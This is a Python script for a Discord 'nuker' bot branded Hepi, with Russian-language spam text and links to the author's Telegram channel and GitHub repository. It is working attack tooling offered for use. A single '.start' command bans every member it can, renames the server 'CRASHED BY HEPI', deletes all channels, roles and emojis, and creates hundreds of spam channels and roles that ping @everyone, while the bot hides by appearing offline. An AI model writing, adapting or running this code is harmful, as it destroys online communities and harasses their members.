import discord, os, sys, random, string, requests
from discord.ext import commands
from discord import Permissions

def clear():
    if os.sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

client = commands.Bot(command_prefix='.', help_command = None)
@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline)

clear()
print(''' __    __   _______ .______    __
|  |  |  | |   ____||   _  \  |  |
|  |__|  | |  |__   |  |_)  | |  |
|   __   | |   __|  |   ___/  |  |
|  |  |  | |  |____ |  |      |  |
|__|  |__| |_______|| _|      |__|
                                   ''')
print('Discord: https://discord.gg/ZmheYFnUsb\nTelegram: https://t.me/termuxpalace')

@client.command()
async def start(ctx):
    ban = 0
    for member in ctx.guild.members:
        try:
            ban += 1
            await member.ban()
        except:
            continue
    await ctx.guild.edit(name='CRASHED BY HEPI')
    for channel in ctx.guild.channels:
        await channel.delete()
    guild = ctx.message.guild
    for _ in range(200):
        channel = await guild.create_text_channel(name='crashed-by-hepi')
        for _ in range(3):
            await channel.send('**Сервер был крашнут!**\n\nРепозиторий на Github: https://github.com/MrProCatYT/Hepi\nТелеграм: https://t.me/termuxpalace\n\n@everyone')
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
        else:
            break
    for _ in range(200):
        await guild.create_role(name="Crashed by Hepi")
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
try:
    client.run('ВВЕДИТЕ ТОКЕН')
except Exception:
    pass
